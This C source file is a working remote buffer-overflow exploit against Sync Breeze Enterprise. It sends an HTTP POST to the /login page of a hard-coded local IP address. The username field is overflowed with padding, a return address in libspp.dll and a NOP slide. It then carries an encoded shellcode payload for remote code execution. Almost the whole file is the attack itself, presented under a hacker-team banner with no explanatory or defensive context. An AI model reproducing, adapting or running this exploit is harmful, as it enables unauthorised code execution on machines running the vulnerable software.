/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.254.54");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.254.54\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.254.54/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";
	
    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; //ret at libspp.dll win10x64

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xbd\x80\xbe\xd6\x1b\xdb\xd1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xee\xfc\x31\x6e\x0e\x03\xee\xb0\x34\xee\x12\x24\x3a"
"\x11\xea\xb5\x5b\x9b\x0f\x84\x5b\xff\x44\xb7\x6b\x8b\x08\x34"
"\x07\xd9\xb8\xcf\x65\xf6\xcf\x78\xc3\x20\xfe\x79\x78\x10\x61"
"\xfa\x83\x45\x41\xc3\x4b\x98\x80\x04\xb1\x51\xd0\xdd\xbd\xc4"
"\xc4\x6a\x8b\xd4\x6f\x20\x1d\x5d\x8c\xf1\x1c\x4c\x03\x89\x46"
"\x4e\xa2\x5e\xf3\xc7\xbc\x83\x3e\x91\x37\x77\xb4\x20\x91\x49"
"\x35\x8e\xdc\x65\xc4\xce\x19\x41\x37\xa5\x53\xb1\xca\xbe\xa0"
"\xcb\x10\x4a\x32\x6b\xd2\xec\x9e\x8d\x37\x6a\x55\x81\xfc\xf8"
"\x31\x86\x03\x2c\x4a\xb2\x88\xd3\x9c\x32\xca\xf7\x38\x1e\x88"
"\x96\x19\xfa\x7f\xa6\x79\xa5\x20\x02\xf2\x48\x34\x3f\x59\x05"
"\xf9\x72\x61\xd5\x95\x05\x12\xe7\x3a\xbe\xbc\x4b\xb2\x18\x3b"
"\xab\xe9\xdd\xd3\x52\x12\x1e\xfa\x90\x46\x4e\x94\x31\xe7\x05"
"\x64\xbd\x32\x89\x34\x11\xed\x6a\xe4\xd1\x5d\x03\xee\xdd\x82"
"\x33\x11\x34\xab\xde\xe8\xdf\x14\xb6\x0c\x2c\xfd\xc5\xf0\x52"
"\x46\x40\x16\x3e\xa8\x05\x81\xd7\x51\x0c\x59\x49\x9d\x9a\x24"
"\x49\x15\x29\xd9\x04\xde\x44\xc9\xf1\x2e\x13\xb3\x54\x30\x89"
"\xdb\x3b\xa3\x56\x1b\x35\xd8\xc0\x4c\x12\x2e\x19\x18\x8e\x09"
"\xb3\x3e\x53\xcf\xfc\xfa\x88\x2c\x02\x03\x5c\x08\x20\x13\x98"
"\x91\x6c\x47\x74\xc4\x3a\x31\x32\xbe\x8c\xeb\xec\x6d\x47\x7b"
"\x68\x5e\x58\xfd\x75\x8b\x2e\xe1\xc4\x62\x77\x1e\xe8\xe2\x7f"
"\x67\x14\x93\x80\xb2\x9c\xb3\x62\x16\xe9\x5b\x3b\xf3\x50\x06"
"\xbc\x2e\x96\x3f\x3f\xda\x67\xc4\x5f\xaf\x62\x80\xe7\x5c\x1f"
"\x99\x8d\x62\x8c\x9a\x87";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
